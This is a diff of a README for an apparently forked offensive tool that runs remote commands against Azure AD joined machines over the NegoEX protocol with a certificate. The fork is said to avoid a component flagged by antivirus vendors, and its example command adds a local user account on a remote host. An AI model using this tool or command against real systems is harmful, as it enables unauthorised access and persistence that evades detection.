@@ -1,12 +1,12 @@
-# AzureADJoinedMachine
-A tool to run PSEXEC over NegoEX protocol against Azure AD joined machine
+A fork of the tool by Mor Rubin: https://github.com/morRubin/AzureADJoinedMachinePTC
+
+The original tool invokes remcomsvc which is detected as malicious using almost any vendor.
 
 ## Installation
 The code is compatible with Python 3.6+
-Clone the repository from GitHub, install the dependencies and you should be good to go
+Download the repository from GitHub, install the dependencies and you should be good to go
 
-```bash
-https://github.com/morRubin/AzureADJoinedMachinePTC
+```
 pip3 install impacket minikerberos cryptography==3.1.1 pyasn1
 ```
 
@@ -14,20 +14,17 @@ pip3 install impacket minikerberos cryptography==3.1.1 pyasn1
 
 ```
 Main.py [-h] --usercert USERCERT --certpass CERTPASS --remoteip
-               REMOTEIP
+               REMOTEIP --command COMMAND
 ```
 
 ## Example
 
 ```
-Main.py --usercert "Gadmin.pfx" --certpass mor --remoteip 192.168.1.2
+Main.py --usercert "p2pcert.pfx" --certpass Aa123456 --remoteip 192.168.47.192 --command "net user test Aa123456 /add"
 ```
 
 ## License
 MIT
 
 ## Credits
-* [Benjamin Delpy](https://twitter.com/gentilkiwi) for implementing Kerberos parts in [kekeo](https://github.com/gentilkiwi/kekeo)
-* [SkelSec](https://twitter.com/skelsec) for [minikerberos](https://github.com/skelsec/minikerberos/tree/master/minikerberos)
-* Alberto Solino and the team at SecureAuthCorp for [impacket](https://github.com/SecureAuthCorp/impacket)
-* [Dirk Jan](https://twitter.com/_dirkjan) for implementing PKINIT on Python3 [PKINITtools](https://github.com/dirkjanm/PKINITtools)
+* [Mor Rubin] for the amazing research and authentication implementation
